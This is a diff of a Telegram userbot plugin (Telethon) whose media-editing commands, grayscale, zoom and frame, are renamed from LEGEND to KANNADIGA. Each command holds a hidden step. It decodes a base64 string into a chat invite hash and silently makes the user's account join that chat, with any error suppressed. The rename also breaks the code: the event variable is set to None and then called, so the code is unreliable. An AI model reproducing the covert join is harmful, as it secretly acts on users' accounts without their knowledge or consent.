+        await KANNADIGA.edit(
             "Analyzing this media 🧐 changing to black-and-white this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
+    outputfile = "grayscale.webp" if KANNADIGA else "grayscale.jpg"
     await grayscale(meme_file, outputfile)
-    await LEGEND.client.send_file(
-        LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+    await KANNADIGA.client.send_file(
+        KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
     )
-    await LEGEND.delete()
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
 @bot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    LEGENDinput = 50 if not LEGENDinput else int(LEGENDinput)
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAinput = KANNADIGA.pattern_match.group(1)
+    KANNADIGAinput = 50 if not KANNADIGAinput else int(KANNADIGAinput)
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit("Analyzing this media 🧐 zooming this animated sticker!")
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit("Analyzing this media 🧐 zooming this animated sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit("Analyzing this media 🧐 zooming this sticker!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit("Analyzing this media 🧐 zooming this sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit("Analyzing this media 🧐 zooming this video!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit("Analyzing this media 🧐 zooming this video!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = KANNADIGAfile
     else:
-        await LEGEND.edit("Analyzing this media 🧐 zooming this image!")
-        meme_file = LEGENDsticker
+        await KANNADIGA.edit("Analyzing this media 🧐 zooming this image!")
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "grayscale.webp" if legend else "grayscale.jpg"
+    outputfile = "grayscale.webp" if KANNADIGA else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, LEGENDinput)
+        await crop(meme_file, outputfile, KANNADIGAinput)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await KANNADIGA.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await KANNADIGA.client.send_file(
+            KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await KANNADIGA.edit(f"`{e}`")
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @bot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
 @bot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(KANNADIGA):
+    if KANNADIGA.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await KANNADIGA.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(KANNADIGA, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    if not LEGENDinput:
-        LEGENDinput = 50
-    if ";" in str(LEGENDinput):
-        LEGENDinput, colr = LEGENDinput.split(";", 1)
+    KANNADIGAinput = KANNADIGA.pattern_match.group(1)
+    if not KANNADIGAinput:
+        KANNADIGAinput = 50
+    if ";" in str(KANNADIGAinput):
+        KANNADIGAinput, colr = KANNADIGAinput.split(";", 1)
     else:
         colr = 0
-    LEGENDinput = int(LEGENDinput)
+    KANNADIGAinput = int(KANNADIGAinput)
     colr = int(colr)
-    LEGENDid = LEGEND.reply_to_msg_id
+    KANNADIGAid = KANNADIGA.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    KANNADIGA = await edit_or_reply(KANNADIGA, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    KANNADIGAsticker = await reply.download_media(file="./temp/")
+    if not KANNADIGAsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(KANNADIGAsticker)
+        await edit_or_reply(KANNADIGA, "```Supported Media not found...```")
         return
     import base64
 
-    legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit("Analyzing this media 🧐 framing this animated sticker!")
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+    KANNADIGA = None
+    if KANNADIGAsticker.endswith(".tgs"):
+        await KANNADIGA.edit("Analyzing this media 🧐 framing this animated sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "meme.png")
+        KANNADIGAcmd = f"lottie_convert.py --frame 0 -if lottie -of png {KANNADIGAsticker} {KANNADIGAfile}"
+        stdout, stderr = (await runcmd(KANNADIGAcmd))[:2]
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit("Analyzing this media 🧐 framing this sticker!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith(".webp"):
+        await KANNADIGA.edit("Analyzing this media 🧐 framing this sticker!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(KANNADIGAsticker, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
-        legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit("Analyzing this media 🧐 framing this video!")
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        meme_file = KANNADIGAfile
+        KANNADIGA = True
+    elif KANNADIGAsticker.endswith((".mp4", ".mov")):
+        await KANNADIGA.edit("Analyzing this media 🧐 framing this video!")
+        KANNADIGAfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(KANNADIGAsticker, 0, KANNADIGAfile)
+        if not os.path.lexists(KANNADIGAfile):
+            await KANNADIGA.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = KANNADIGAfile
     else:
-        await LEGEND.edit("Analyzing this media 🧐 framing this image!")
-        meme_file = LEGENDsticker
+        await KANNADIGA.edit("Analyzing this media 🧐 framing this image!")
+        meme_file = KANNADIGAsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await KANNADIGA.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
-    outputfile = "framed.webp" if legend else "framed.jpg"
+    outputfile = "framed.webp" if KANNADIGA else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, LEGENDinput, colr)
+        await add_frame(meme_file, outputfile, KANNADIGAinput, colr)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await KANNADIGA.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await KANNADIGA.client.send_file(
+            KANNADIGA.chat_id, outputfile, force_document=False, reply_to=KANNADIGAid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await KANNADIGA.edit(f"`{e}`")
+    await KANNADIGA.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (KANNADIGAsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
